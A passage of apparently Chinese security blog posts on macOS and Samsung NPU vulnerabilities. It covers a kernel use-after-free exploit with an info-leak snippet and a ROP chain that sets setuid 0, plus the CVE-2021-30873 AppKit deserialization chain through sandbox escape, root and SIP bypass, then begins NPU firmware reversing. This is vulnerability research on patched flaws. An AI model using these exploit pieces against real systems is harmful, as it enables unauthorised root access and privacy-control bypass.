&lt;true/&gt; &lt;!-- 8: free block2; free list: block2, block1 --&gt; &lt;key&gt;a&lt;/key&gt; &lt;!-- 9: key &quot;a&quot; --&gt; &lt;data&gt; vtable pointer &lt;/data&gt; &lt;!-- 10: OSData gets block2, data gets block1 --&gt; &lt;key&gt;b&lt;/key&gt; &lt;!-- 11: key &quot;b&quot; --&gt; &lt;object&gt;2&lt;/object&gt; &lt;!-- 12: block1-&gt;retain() --&gt;&lt;/dict&gt; a和b均为 OSNumber类型，因为在64位系统上，其 OSNumber的大小和 OSData接近，可以共享一个freelist。然后将aheb赋值为true，将触发释放 OSNumber。在这种情况下，b的 OSNumber在free list的头部，a的 OSNumber紧接其后。通过插入一个OSData对象，可以导致，OSData的容器使用b的 OSNumber，OSData的数据缓冲区使用a的 OSNumber。通过下标引用a的OSNumber将导致在已释放的 OSNumber对象上调用retain函数，该虚函数指针已被覆盖为我们控制的地址，从而导致代码执行。 反汇编看看retain函数调用附近的虚表布局： 12345678910111213ffffff800088016a cmp eax, 0xc000000 ;; case kOSSerializeObjectffffff800088016f jne 0xffffff8000880819ffffff8000880175 mov qword ptr [rbp - 0x40], rdiffffff8000880179 mov rax, qword ptr [rbp - 0x58]ffffff800088017d cmp r12d, eax ;; if (len &gt;= objsIdx) break;ffffff8000880180 jae 0xffffff8000880819ffffff8000880186 mov dword ptr [rbp - 0x4c], edxffffff8000880189 mov eax, r12dffffff800088018c mov rcx, qword ptr [rbp - 0x60]ffffff8000880190 mov r14, qword ptr [rcx + 8*rax] ;; o = objsArray[len]ffffff8000880194 mov rax, qword ptr [r14]ffffff8000880197 mov rdi, r14ffffff800088019a call qword ptr [rax + 0x20] ;; o-&gt;retain() 从 ffffff8000880194的r14（变量o）中读出8个字节给rax，rax是虚指针。下面，rax + 0x20被调用，此时rip在虚指针偏移4处，rax指向虚指针的起始位置。 SMEP和SMAP SMEP将导致CPU产生一个页错误，当内核试图在用户空间执行代码时。 使用内核ROP进行绕过。 SMAP拓展了SMEP，当内核试图访问用户空间内存时就会产生页错误。 SMAP在Intel处理器的Broadwell中引入，绕过需要完全的内核ROP和虚指针。 内核随机基址(kASLR)内核文件在 /System/Library/Kernels/kernel 中。 信息泄露 if_clone_list代码如下： 12345678910111213141516171819202122232425262728static intif_clone_list(int count, int *ret_total, user_addr_t dst){ char outbuf[IFNAMSIZ]; struct if_clone *ifc; int error = 0; *ret_total = if_cloners_count; if (dst == USER_ADDR_NULL) { /* Just asking how many there are. */ return (0); } if (count &lt; 0) return (EINVAL); count = (if_cloners_count &lt; count) ? if_cloners_count : count; for (ifc = LIST_FIRST(&amp;if_cloners); ifc != NULL &amp;&amp; count != 0; ifc = LIST_NEXT(ifc, ifc_list), count--, dst += IFNAMSIZ) { strlcpy(outbuf, ifc-&gt;ifc_name, IFNAMSIZ); error = copyout(outbuf, dst, IFNAMSIZ); if (error) break; } return (error);} 这个函数用于将network interface cloner的名称拷贝到用户空间中。ifc_name比outbuf小时，outbuf中会留下一些字节没有被赋值，或者说是未初始化。但是copyout会将整个outbuf都拷贝到用户空间，也就是说包含未初始化的字节。 IFNAMSIZ被定义为16，一般来讲，很难保证留出8字节的未初始化空间，但是，很巧的是，第一个interface cloner是bridge，将留出9个字节。 看源码，找调用栈： 123456soo_ioctl soioctl ifioctllocked ifioctl ifioctl_ifclone if_clone_list soo_ioctl的定义在socketops中： 12345678910const struct fileops socketops = { DTYPE_SOCKET, soo_read, soo_write, soo_ioctl, soo_select, soo_close, soo_kqfilter, soo_drain}; 看ifioctl的源码，找调用的ioctl： 1234567891011121314151617181920intifioctl(struct socket *so, u_long cmd, caddr_t data, struct proc *p){... switch (cmd) { case OSIOCGIFCONF32: /* struct ifconf32 */ case SIOCGIFCONF32: /* struct ifconf32 */ case SIOCGIFCONF64: /* struct ifconf64 */ case OSIOCGIFCONF64: /* struct ifconf64 */ error = ifioctl_ifconf(cmd, data); goto done; case SIOCIFGCLONERS32: /* struct if_clonereq32 */ case SIOCIFGCLONERS64: /* struct if_clonereq64 */ error = ifioctl_ifclone(cmd, data); goto done;... }...} 通过上面的源码，可以找到SIOCIFGCLONERS命令，该命令结合一个结构体if_clonereq就可以了。 通过下面的代码，获取内核信息： 12345678int sockfd = socket(AF_INET, SOCK_STREAM, 0);char buffer[IFNAMSIZ];struct if_clonereq ifcr = { .ifcr_count = 1, .ifcr_buffer = buffer,};int err = ioctl(sockfd, SIOCIFGCLONERS, &amp;ifcr);printf(&quot;0x%016llx\\n&quot;, *(uint64_t *)(buffer + 8)); 如果幸运的话，泄漏的地址类似0xffffff801873487f这种，低21位（0x3487f）是对的。使用otool查找内核，发现一条指令： 12_ledger_credit+95:ffffff800033487f mov eax, r14d 两者相减，就能得到内核偏移。 构建ROP使用ROPgadget在内核镜像中查找ROP。这里 current_proc等都是函数，ret到函数上，没什么问题： 12345678910111213uint64_t * vtable = (uint64_t *)payload_addr;uint64_t * rop_stack = ((uint64_t *)(payload_addr + size)) - 8;/* Virtual method 4 is called in the kernel with rax set to 0. */vtable[0] = (uint64_t)rop_stack; /* *0 = rop_stack */vtable[4] = xchg_esp_eax_pop_rsp; /* rsp = 0; rsp = *rsp; start rop */rop_stack[0] = current_proc; /* rax = &amp;proc */rop_stack[1] = xchg_rax_rdi; /* rdi = &amp;proc */rop_stack[2] = proc_ucred; /* rax = &amp;cred */rop_stack[3] = xchg_rax_rdi; /* rdi = &amp;cred */rop_stack[4] = posix_cred_get; /* rax = &amp;posix_cred */rop_stack[5] = xchg_rax_rdi; /* rdi = &amp;posix_cred */rop_stack[6] = set_svuid_0; /* we are now setuid 0 */rop_stack[7] = thread_exception_return; /* stop rop 问题漏洞利用有的时候会崩溃，原因是rax为0，改进方式是在0处分配假的vtable，实现方式是将exp编译为32位，以支持映射NULL page，同时还要使用一些特殊的链接标志，以使mach-o文件不会有一个__PAGEZERO节。 CVE-2021-30873一个影响基于AppKit开发的应用程序的进程注入漏洞。 影响范围macOS 11.3之前。 漏洞原理漏洞出现在Mac的状态保存机制上，状态保存用于重启后恢复应用程序的状态，或者，将在Dock中的长时间不使用的应用程序关闭掉（虽然看上去Dock中的图标和界面都在，实际上只是一个图片），在应用程序被点击后再依据保存的状态进行恢复。 当使用AppKit开发时，状态保存功能是自动被添加的，所以这个漏洞和AppKit有关。 状态保存需要写入两个文件： 12~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/windows.plist~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/data.data plist文件类似下面这种： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;plist version=&quot;1.0&quot;&gt;&lt;array&gt; &lt;dict&gt; &lt;key&gt;MenuBar AvailableSpace&lt;/key&gt; &lt;real&gt;1248&lt;/real&gt; &lt;key&gt;NSDataKey&lt;/key&gt; &lt;data&gt; Ay1IqBriwup4bKAanpWcEw== &lt;/data&gt; &lt;key&gt;NSIsMainMenuBar&lt;/key&gt; &lt;true/&gt; &lt;key&gt;NSWindowID&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;key&gt;NSWindowNumber&lt;/key&gt; &lt;integer&gt;5978&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;NSDataKey&lt;/key&gt; &lt;data&gt; 5lyzOSsKF24yEcwAKTBSVw== &lt;/data&gt; &lt;key&gt;NSDragRegion&lt;/key&gt; &lt;data&gt; AAAAgAIAAADAAQAABAAAAAMAAABHAgAAxgEAAAoAAAADAAAABwAAABUAAAAb AAAAKQAAAC8AAAA9AAAARwIAAMcBAAAMAAAAAwAAAAcAAAAVAAAAGwAAACkA AAAvAAAAPQAAAAkBAABLAQAARwIAANABAAAKAAAAFQAAABsAAAApAAAALwAA AD0AAAAJAQAASwEAAD4CAADWAQAABgAAAAwAAAAJAQAASwEAAD4CAADXAQAA BAAAAAwAAAA+AgAA2QEAAAIAAAD///9/ &lt;/data&gt; &lt;key&gt;NSTitle&lt;/key&gt; &lt;string&gt;Untitled&lt;/string&gt; &lt;key&gt;NSUIID&lt;/key&gt; &lt;string&gt;_NS:34&lt;/string&gt; &lt;key&gt;NSWindowCloseButtonFrame&lt;/key&gt; &lt;string&gt;{{7, 454}, {14, 16}}&lt;/string&gt; &lt;key&gt;NSWindowFrame&lt;/key&gt; &lt;string&gt;177 501 586 476 0 0 1680 1025 &lt;/string&gt; &lt;key&gt;NSWindowID&lt;/key&gt; &lt;integer&gt;2&lt;/integer&gt; &lt;key&gt;NSWindowLevel&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;NSWindowMiniaturizeButtonFrame&lt;/key&gt; &lt;string&gt;{{27, 454}, {14, 16}}&lt;/string&gt; &lt;key&gt;NSWindowNumber&lt;/key&gt; &lt;integer&gt;5982&lt;/integer&gt; &lt;key&gt;NSWindowWorkspaceID&lt;/key&gt; &lt;string&gt;&lt;/string&gt; &lt;key&gt;NSWindowZoomButtonFrame&lt;/key&gt; &lt;string&gt;{{47, 454}, {14, 16}}&lt;/string&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;CFBundleVersion&lt;/key&gt; &lt;string&gt;378&lt;/string&gt; &lt;key&gt;NSDataKey&lt;/key&gt; &lt;data&gt; P7BYxMryj6Gae9Q76wpqVw== &lt;/data&gt; &lt;key&gt;NSDockMenu&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;command&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;key&gt;mark&lt;/key&gt; &lt;integer&gt;2&lt;/integer&gt; &lt;key&gt;name&lt;/key&gt; &lt;string&gt;Untitled&lt;/string&gt; &lt;key&gt;system-icon&lt;/key&gt; &lt;integer&gt;1735879022&lt;/integer&gt; &lt;key&gt;tag&lt;/key&gt; &lt;integer&gt;2&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;separator&lt;/key&gt; &lt;true/&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;command&lt;/key&gt; &lt;integer&gt;2&lt;/integer&gt; &lt;key&gt;indent&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;key&gt;name&lt;/key&gt; &lt;string&gt;New Document&lt;/string&gt; &lt;key&gt;tag&lt;/key&gt; &lt;integer&gt;0&lt;/integer&gt; &lt;/dict&gt; &lt;/array&gt; &lt;key&gt;NSExecutableInode&lt;/key&gt; &lt;integer&gt;1152921500311961010&lt;/integer&gt; &lt;key&gt;NSIsGlobal&lt;/key&gt; &lt;true/&gt; &lt;key&gt;NSSystemAppearance&lt;/key&gt; &lt;data&gt; YnBsaXN0MDDUAQIDBAUGBwpYJHZlcnNpb25ZJGFyY2hpdmVyVCR0b3BYJG9i amVjdHMSAAGGoF8QD05TS2V5ZWRBcmNoaXZlctEICVRyb290gAGkCwwRElUk bnVsbNINDg8QViRjbGFzc18QEE5TQXBwZWFyYW5jZU5hbWWAA4ACXxAUTlNB cHBlYXJhbmNlTmFtZUFxdWHSExQVFlokY2xhc3NuYW1lWCRjbGFzc2VzXE5T QXBwZWFyYW5jZaIVF1hOU09iamVjdAgRGiQpMjdJTFFTWF5jan1/gZidqLG+ wQAAAAAAAAEBAAAAAAAAABgAAAAAAAAAAAAAAAAAAADK &lt;/data&gt; &lt;key&gt;NSSystemVersion&lt;/key&gt; &lt;array&gt; &lt;integer&gt;12&lt;/integer&gt; &lt;integer&gt;2&lt;/integer&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/array&gt; &lt;key&gt;NSWindowID&lt;/key&gt; &lt;integer&gt;4294967295&lt;/integer&gt; &lt;key&gt;NSWindowZOrder&lt;/key&gt; &lt;array&gt; &lt;integer&gt;5982&lt;/integer&gt; &lt;/array&gt; &lt;/dict&gt;&lt;/array&gt;&lt;/plist&gt; data.data文件包含自定义二进制格式，包含一系列的记录，每个记录包含AES-CBC加密的序列化对象。windows.plist文件则包含和记录相对应的key (NSDataKey)和ID(NSWindowID)。 1234567891011121314151617181920212223242526272800000000 4e 53 43 52 31 30 30 30 00 00 00 01 00 00 01 b0 |NSCR1000........|00000010 ec f2 26 b9 8b 06 c8 d0 41 5d 73 7a 0e cc 59 74 |..&amp;.....A]sz..Yt|00000020 89 ac 3d b3 b6 7a ab 1b bb f7 84 0c 05 57 4d 70 |..=..z.......WMp|00000030 cb 55 7f ee 71 f8 8b bb d4 fd b0 c6 28 14 78 23 |.U..q.......(.x#|00000040 ed 89 30 29 92 8c 80 bf 47 75 28 50 d7 1c 9a 8a |..0)....Gu(P....|00000050 94 b4 d1 c1 5d 9e 1a e0 46 62 f5 16 76 f5 6f df |....]...Fb..v.o.|00000060 43 a5 fa 7a dd d3 2f 25 43 04 ba e2 7c 59 f9 e8 |C..z../%C...|Y..|00000070 a4 0e 11 5d 8e 86 16 f0 c5 1d ac fb 5c 71 fd 9d |...]........\\q..|00000080 81 90 c8 e7 2d 53 75 43 6d eb b6 aa c7 15 8b 1a |....-SuCm.......|00000090 9c 58 8f 19 02 1a 73 99 ed 66 d1 91 8a 84 32 7f |.X....s..f....2.|000000a0 1f 5a 1e e8 ae b3 39 a8 cf 6b 96 ef d8 7b d1 46 |.Z....9..k...{.F|000000b0 0c e2 97 d5 db d4 9d eb d6 13 05 7d e0 4a 89 a4 |...........}.J..|000000c0 d0 aa 40 16 81 fc b9 a5 f5 88 2b 70 cd 1a 48 94 |..@.......+p..H.|000000d0 47 3d 4f 92 76 3a ee 34 79 05 3f 5d 68 57 7d b0 |G=O.v:.4y.?]hW}.|000000e0 54 6f 80 4e 5b 3d 53 2a 6d 35 a3 c9 6c 96 5f a5 |To.N[=S*m5..l._.|000000f0 06 ec 4c d3 51 b9 15 b8 29 f0 25 48 2b 6a 74 9f |..L.Q...).%H+jt.|00000100 1a 5b 5e f1 14 db aa 8d 13 9c ef d6 f5 53 f1 49 |.[^..........S.I|00000110 4d 78 5a 89 79 f8 bd 68 3f 51 a2 a4 04 ee d1 45 |MxZ.y..h?Q.....E|00000120 65 ba c4 40 ad db e3 62 55 59 9a 29 46 2e 6c 07 |e..@...bUY.)F.l.|00000130 34 68 e9 00 89 15 37 1c ff c8 a5 d8 7c 8d b2 f0 |4h....7.....|...|00000140 4b c3 26 f9 91 f8 c4 2d 12 4a 09 ba 26 1d 00 13 |K.&amp;....-.J..&amp;...|00000150 65 ac e7 66 80 c0 e2 55 ec 9a 8e 09 cb 39 26 d4 |e..f...U.....9&amp;.|00000160 c8 15 94 d8 2c 8b fa 79 5f 62 18 39 f0 a5 df 0b |....,..y_b.9....|00000170 3d a4 5c bc 30 d5 2b cc 08 88 c8 49 d6 ab c0 e1 |=.\\.0.+....I....|00000180 c1 e5 41 eb 3e 2b 17 80 c4 01 64 3d 79 be 82 aa |..A.&gt;+....d=y...|00000190 3d 56 8d bb e5 7a ea 89 0f 4c dc 16 03 e9 2a d8 |=V...z...L....*.|000001a0 c5 3e 25 ed c2 4b 65 da 8a d9 0d d9 23 92 fd 06 |.&gt;%..Ke.....#...|[...] 漏洞在于存储在data.data中的加密序列化对象没有使用安全编码API。 Objective-C serialization类可以通过NSCoding实现序列化，实现的类必须包含Coder方法： 1- (id)initWithCoder:(NSCoder *)coder; 在这个方法中，对象可以使用coder去解码它的实例变量，可以使用的方法有：-decodeObjectForKey:, -decodeIntegerForKey:, -decodeDoubleForKey:等。当使用-decodeObjectForKey:方法时，可以在该对象上递归调用-initWithCoder:方法，直至解码整个对象。 Apple认识到-decodeObjectForKey:方法是有风险的，于是在10.8上加入了 NSSecureCoding安全编码方法。 原本的方法是先创建一个对象，再检查它的类型，引入安全编码后，变成了在解码时，需要先指定一系列类。 不安全的： 12id obj = [decoder decodeObjectForKey:@&quot;myKey&quot;];if (![obj isKindOfClass:[MyClass class]]) { /* ...fail... */ } 安全的： 1id obj = [decoder decodeObjectOfClass:[MyClass class] forKey:@&quot;myKey&quot;]; 利用思路在保存状态的data.data文件中，对象是使用NSKeyedArchiver储存的，没有启用安全编码。这意味着我们可以包括任何实现NSCoding协议的类的对象。可能的原因是，应用程序可以用他们自己的对象来扩展保存的状态，由于保存的状态功能比NSSecureCoding要老，苹果不能直接将其升级为安全编码，因为这可能会影响第三方应用程序运行。 有两个对象相结合可以实现漏洞利用。 NSRuleEditor这个类的 -initWithCoder:方法创建了一个同一存档中的对象的绑定，其key路径也是从存档中获得的。Bindings是Cocoa中的反应式编程技术。创建绑定： 1234- (void)bind:(NSBindingName)binding toObject:(id)observable withKeyPath:(NSString *)keyPath options:(NSDictionary&lt;NSBindingOption, id&gt; *)options; 这将把observable的keyPath和接收者的属性binding进行绑定。例如，又一个Person类，其有一个属性 @property (readwrite, copy) NSString *name;，然后可以把界面text的值和Person的name（keyPath）绑定起来。 不同的keypath的options含义选实际上是非常复杂的。例如，当用 “foo “这个关键路径进行绑定时，它首先会检查getFoo、foo、isFoo和_foo这些方法是否存在。这通常会被用来访问对象的一个属性，但这不是必须的。当一个绑定被创建时，该方法将在创建绑定时被立即调用，以提供一个初始值。这意味着，通过在反序列化过程中创建一个绑定，我们可以用它来调用其他反序列化对象上的零参数方法。 123456789101112131415ID NSRuleEditor::initWithCoder:(ID param_1,SEL param_2,ID unarchiver){ ... id arrayOwner = [unarchiver decodeObjectForKey:@&quot;NSRuleEditorBoundArrayOwner&quot;]; ... if (arrayOwner) { keyPath = [unarchiver decodeObjectForKey:@&quot;NSRuleEditorBoundArrayKeyPath&quot;]; [self bind:@&quot;rows&quot; toObject:arrayOwner withKeyPath:keyPath options:nil]; } ...} 这里是利用它调用下一个对象的 -draw方法。 NSCustomImageRep这个对象从存档中获取一个对象和一个selector (a method name)。当调用 -draw方法时，它触发对象的selector方法，并将自己作为第一个参数传递进去： 12345678910111213141516171819ID NSCustomImageRep::initWithCoder:(ID param_1,SEL param_2,ID unarchiver){ ... id drawObject = [unarchiver decodeObjectForKey:@&quot;NSDrawObject&quot;]; self.drawObject = drawObject; id drawMethod = [unarchiver decodeObjectForKey:@&quot;NSDrawMethod&quot;]; SEL selector = NSSelectorFromString(drawMethod); self.drawMethod = selector; ...}...void ___24-[NSCustomImageRep_draw]_block_invoke(long param_1){ ... [self.drawObject performSelector:self.drawMethod withObject:self]; ...} 通过反序列化这两个类，我们现在可以调用零参数方法和多参数方法，尽管第一个参数将是一个NSCustomImageRep对象，其余的参数将是寄存器中的值。 漏洞利用沙箱逃逸原本状态保存的路径为： 1~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/ 如果应用程序在用户关闭计算机时打开过，那么这将是一个指向容器路径的符号链接。 沙箱的存储路径： 1~/Library/Containers/&lt;Bundle ID&gt;/Data/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/ 大多数应用程序不能访问所有文件。沙盒应用程序当然是非常受限制的，但随着TCC的加入，即使是访问下载、文档等文件夹也需要用户批准。如果应用程序想要保存或打开一个文件，但只能看到该应用程序可以访问的文件，那就相当不方便了。为了解决这个问题，在打开这样一个面板时，系统会启动一个进程：com.apple.appkit.xpc.openAndSavePanelService。尽管窗口本身是应用程序的一部分，但其内容是由openAndSavePanelService绘制的。这是一个XPC服务，可以完全访问所有文件。当用户在面板中选择一个文件时，应用程序获得对该文件的临时访问权。这样一来，即使在没有权限列出这些文件的应用程序中，用户仍然可以浏览他们的整个磁盘。 我们注意到的是，这个XPC服务读取了它的保存状态，但使用的是启动它的应用程序的bundle ID，由于这个面板可能是多个应用程序的保存状态的一部分，它需要为每个应用程序分离其状态，这确实有些道理。 结果是，它从容器外的位置读取其保存的状态，但使用应用程序的bundle ID： 1~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/ 沙箱逃逸步骤： 如果符号链接尚不存在，则等待用户在应用程序打开时关机。 在应用程序自己的容器内写入恶意的data.data和windows.plist文件。 打开一个NSOpenPanel或NSSavePanel。 com.apple.appkit.xpc.openAndSavePanelService进程会反序列化恶意对象，让我们在一个非沙盒进程中执行代码。 这比其他问题更早被修复，在macOS 11.3中被列为CVE-2021-30659。苹果通过不再从com.apple.appkit.xpc.openAndSavePanelService中的相同位置加载状态来解决这个问题。 权限提升通过将我们的代码注入一个具有特定权限的应用程序，我们可以将我们的权限提升到root。为此，我们可以应用A2nkF在Unauthd - Logic bugs FTW中介绍的技术。 一些应用程序有一个com.apple.private.AuthorizationServices的权限，其中包含system.install.apple-software的值。这意味着这个应用程序被允许安装有苹果签名的软件包，而无需用户授权。例如，”Install Command Line Developer Tools.app “和 “Bootcamp Assistant.app “有这个权利。A2nkF还发现了一个由苹果签名的软件包，其中包含一个漏洞：macOSPublicBetaAccessUtility.pkg。当这个软件包被安装到一个特定的磁盘时，它将从该磁盘运行（以root身份）一个安装后脚本。该脚本假定它被安装到含有macOS的磁盘上，但这并没有被检查。因此，通过在同一位置创建一个恶意脚本，就有可能通过安装这个软件包以root身份执行代码。 漏洞利用步骤： 创建一个RAM磁盘，并复制一个恶意脚本到将由macOSPublicBetaAccessUtility.pkg执行的路径。 通过为该应用程序创建windows.plist和data.data文件，将我们的代码注入含有system.install.apple-software权利的应用程序中，然后启动它。 使用注入的代码将macOSPublicBetaAccessUtility.pkg包安装到RAM磁盘。 等待安装后脚本的运行。 在A2nkF的文章中，安装后脚本的运行没有SIP的文件系统限制。它从安装过程中继承了这一点，因为软件包的安装可能需要写到SIP保护的位置。这一点已被苹果公司修复：安装后和安装前的脚本不再有SIP豁免。然而，该软件包及其特权升级仍然可以使用，因为苹果仍然使用相同的脆弱的安装包。 SIP绕过现在我们已经逃离了沙盒，并将我们的权限提升到了root。我们在macOS Big Sur Beta安装盘镜像上找到了一些东西。”macOS Update Assistant.app “有com.apple.rootless.install.heritable的权利。这意味着这个进程可以写到所有受SIP保护的位置（而且它是可继承的，这很方便，因为我们可以直接生成一个shell）。虽然它应该只在测试版安装时使用，但我们可以把它复制到正常的macOS环境中，并在那里运行它。 漏洞利用步骤： 为 “macOS Update Assistant.app “创建恶意的windows.plist和data.data文件。 启动 “macOS Update Assistant.app”。 当免于SIP的文件系统限制时，我们可以从受保护的位置读取所有文件，如用户的Mail.app邮箱。我们还可以修改TCC数据库，这意味着我们可以授予自己访问网络摄像头、麦克风等的权限。我们还可以将我们的恶意软件持续存在于受SIP保护的位置，使苹果以外的人很难删除它。最后，我们可以改变批准的内核扩展数据库。这意味着，我们可以默默地加载一个新的内核扩展，而不需要用户批准。当与一个易受攻击的内核扩展（或一个允许签署内核扩展的编码证书）相结合时，我们将能够获得内核代码执行，这也将允许禁用所有其他限制。 修复苹果在11.3中首先修复了沙盒逃逸，不再读取com.apple.appkit.xpc.openAndSavePanelService中应用程序的保存状态（CVE-2021-30659）。 修复该漏洞的其余部分则更为复杂。第三方应用程序可能会在保存状态中存储自己的对象，这些对象可能不支持安全编码。方法：-applicationSupportsSecureRestorableState:。应用程序现在可以通过从该方法返回TRUE来选择是否需要对其保存状态进行安全编码。除非应用程序选择加入，否则它将继续允许非安全编码，这意味着进程注入可能仍然存在。 这确实突出了这些安全措施的当前设计的一个问题：降级攻击。一个应用程序的代码签名（以及由此产生的权利）将在很长一段时间内保持有效，如果应用程序被降级，应用程序的TCC权限仍将有效。一个没有沙盒的应用程序可以默默地下载一个旧的、有漏洞的应用程序版本，并利用它。对于SIP绕过来说，这将不起作用，因为 “macOS Update Assistant.app “不能在macOS Monterey上运行，因为某些私有框架不再包含必要的符号。但这是一个巧合的修复，在许多其他情况下，旧的应用程序可能仍然运行良好。因此，只要对旧的macOS应用程序有向后的兼容性，这个漏洞就会一直存在。","link":"/2022/10/10/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"逆向三星NPU固件及漏洞利用","text":"前言 与以往的的Galaxy S系列相同，三星Galaxy S10系列新机继续使用双处理器策略：在中国、美国、拉丁美洲、日本等国家和地区使用骁龙855处理器，而在其他地区采用三星自家的Exynos 9820处理器。 介绍 神经处理器或者神经处理单元(NPU)是一个特殊的电路组件，它实现了所有运行机器学习算法所需的控制和算术逻辑，典型的是执行预测模型，比如人工神经网络ANN或随机森林RF。 截至2021/8/11，三星共发布了8款NPU固件： Exynos 880 Exynos 9820 Exynos 9825 Exynos 980 Exynos 990 Exynos 1080 Exynos 2100 Exynos Auto V9 https://en.wikipedia.org/wiki/Exynos#Exynos_9800_series_(2018/19) 以下主要以Galaxy S20的Exynos 990为例进行示范。一个单独的固件通常具有很大的攻击面，PZ公布了很多关于三星NPU的漏洞利用。 自测：S10 G9730ZCU5FUC2 环境分析基于Galaxy S20 SM-G980F，固件版本G980FXXS5CTL5。首先需要获取设备的root权限，否则无法访问dmesg和NPU驱动。 三星通常会在开发时加入大量的调试信息，NPU也不例外，dmesg中关于NPU驱动和固件的log信息十分丰富。 123456789101112x1s:/ # sysctl -w kernel.kptr_restrict=1x1s:/ # dmesg -w | grep &quot;NPU:&quot;[102.037911] [Exynos][NPU][NOTICE]: NPU:[*]npu_debug_open(221):start in npu_debug open[102.037928] [Exynos][NPU][NOTICE]: NPU:[*]npu_debug_open(222):complete in npu_debug open[102.037936] [Exynos][NPU][NOTICE]: NPU:[*]npu_log_open(1335):start in npu_log_open[102.037943] [Exynos][NPU][NOTICE]: NPU:[*]npu_log_open(1336):complete in npu_log_open[102.037951] [Exynos][NPU][NOTICE]: NPU:[*]npu_util_memdump_open(319):start in npu_util_memdump_open[102.037958] [Exynos][NPU][NOTICE]: NPU:[*]npu_util_memdump_open(344):complete in npu_util_memdump_open[102.037966] [Exynos][NPU][NOTICE]: NPU:[*]npu_scheduler_open(1458):done[102.039801] [Exynos][NPU][NOTICE]: NPU:[*]npu_system_resume(387):wake_lock, now(1)[102.039813] [Exynos][NPU][NOTICE]: NPU:[*]npu_system_alloc_fw_dram_log_buf(93):start: initialization.[102.040957] [Exynos][NPU][NOTICE]: NPU:[*]npu_system_alloc_fw_dram_log_buf(103):DRAM log buffer for kernel: size(2097152) / dv(0x0000000080000000) / kv(ffffff802ca85000) debugfs项也可以用来查看一些NPU信息： 1234567891011121314x1s:/ # ls -la /d/npu/total 0drwxr-xr-x 2 root root 0 2021-01-30 18:18 .drwxr-xr-x 63 system system 0 1970-01-01 01:00 ..-rw------- 1 root root 0 2021-01-30 18:21 SRAM-IDP-rw------- 1 root root 0 2021-01-30 18:21 SRAM-TCU-r-------- 1 root root 0 2021-01-30 18:18 dev-log-r-------- 1 root root 0 2021-01-30 18:21 fw-log-SRAM-r-------- 1 root root 0 2021-01-30 18:18 fw-profile-r-------- 1 root root 0 2021-01-30 18:18 fw-report-rw------- 1 root root 0 2021-01-30 18:18 idiot-r-------- 1 root root 0 2021-01-30 18:18 proto-drv-dump-r-------- 1 root root 0 2021-01-30 18:18 result-golden-match--w------- 1 root root 0 2021-01-30 18:18 set-golden-desc 初始化NPU和加载NPU固件加载NPU驱动本节主要介绍NPU驱动是怎样被内核启动的，以及固件加载的相关操作。 初始化操作是在drivers/vision/npu/core/npu-device.c中定义的，内核在启动时调用npu_device_init()函数。 自测：drivers/media/platform/msm目录下的npu文件夹中。 12345678910111213/* ------------------------------------------------------------------------- * Module Entry Points * ------------------------------------------------------------------------- */static int __init npu_init(void){ int rc; rc = platform_driver_register(&amp;npu_driver); if (rc) NPU_ERR(&quot;register failed %d\\n&quot;, rc); return rc;} npu_init()调用platform_driver_register()函数，参数为struct platform_driver类型。 12345678910static struct platform_driver npu_driver = { .probe = npu_device_probe, .remove = npu_device_remove, .driver = { .name = &quot;exynos-npu&quot;, .owner = THIS_MODULE, .pm = &amp;npu_pm_ops, .of_match_table = of_match_ptr(exynos_npu_match), },}; 自测： 123456789static struct platform_driver npu_driver = { .probe = npu_probe, .remove = npu_remove, .driver = { .name = &quot;msm_npu&quot;, .of_match_table = npu_dt_match, .pm = &amp;npu_pm_ops, },}; 1234static const struct of_device_id npu_dt_match[] = { { .compatible = &quot;qcom,msm-npu&quot;,}, {}}; 当内核加载NPU模块时，npu_device_probe()函数会被调用，自测：npu_probe()， 1234567891011121314151617181920212223242526272829303132333435363738394041static int npu_device_probe(struct platform_device *pdev){ int ret = 0; struct device *dev; struct npu_device *device; dev = &amp;pdev-&gt;dev; device = devm_kzalloc(dev, sizeof(*device), GFP_KERNEL); device-&gt;dev = dev; ret = npu_system_probe(&amp;device-&gt;system, pdev); ret = npu_debug_probe(device); ret = npu_log_probe(device); ret = npu_vertex_probe(&amp;device-&gt;vertex, dev); ret = proto_drv_probe(device); ret = npu_sessionmgr_probe(&amp;device-&gt;sessionmgr);#ifdef CONFIG_NPU_GOLDEN_MATCH ret = register_golden_matcher(dev);#endif#ifdef CONFIG_NPU_LOOPBACK ret = mailbox_mgr_mock_probe(device);#endif ret = npu_profile_probe(&amp;device-&gt;system); ret = iovmm_activate(dev); iovmm_set_fault_handler(dev, npu_iommu_fault_handler, device); dev_set_drvdata(dev, device); ret = 0; probe_info(&quot;complete in %s\\n&quot;, __func__); goto ok_exit;err_exit: probe_err(&quot;error on %s ret(%d)\\n&quot;, __func__, ret);ok_exit: return ret;} npu_device_probe初始化以下组件： 中断(使用相关的DTS file) 映射共享内存 映射相关IO设备 npu 接口和mailbox 二进制固件路径 /data/NPU.bin 和/vendor/firmware/NPU.bin 如果上述两个路径不存在，设备将从内核镜像的 npu/NPU.bin中加载 debugfs项 vertex对象 除其他事情外，设置文件操作和ioctl处理函数： File operations: npu_vertex_fops Ioctl handlers: npu_vertex_ioctl_ops session manager iovmm 